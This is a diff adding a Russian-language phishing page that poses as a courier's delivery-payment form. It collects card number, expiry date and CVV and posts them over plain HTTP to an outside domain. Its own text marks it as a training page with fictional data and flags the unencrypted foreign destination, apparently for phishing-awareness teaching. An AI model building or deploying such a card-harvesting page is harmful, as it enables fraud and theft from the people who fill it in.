@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="ru">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Оплата доставки</title><link rel="stylesheet" href="page.css">
+<style>:root{--c:#0a7d4f}</style></head>
+<body>
+<div class="site"><div class="logo">П</div><b>ПочтаЭкспресс</b><span>учебная страница · все данные вымышлены</span></div>
+<main>
+
+<div class="box"><span class="badge">Отправление RU-4410-2291</span>
+  <h1>Оплата доставки посылки</h1>
+  <p>Ваша посылка ожидает отправки. Оплатите доставку, чтобы курьер привёз её завтра.</p>
+  <div class="total"><span>Доставка</span><span>349 ₽</span></div></div>
+<form class="box" action="http://pay-delivery-check.ru/submit" method="post">
+  <label for="cc">Номер карты</label><input id="cc" name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000">
+  <div class="row"><div><label for="exp">Срок действия</label><input id="exp" name="exp" autocomplete="cc-exp" placeholder="ММ/ГГ"></div>
+  <div><label for="cvc">CVV/CVC</label><input id="cvc" name="cvc" autocomplete="cc-csc" placeholder="123"></div></div>
+  <button type="submit">Оплатить 349 ₽</button>
+  <p class="muted">Форма отправляется на http://pay-delivery-check.ru — без шифрования и на чужой сайт.</p>
+</form>
+</main>
+</body>
+</html>
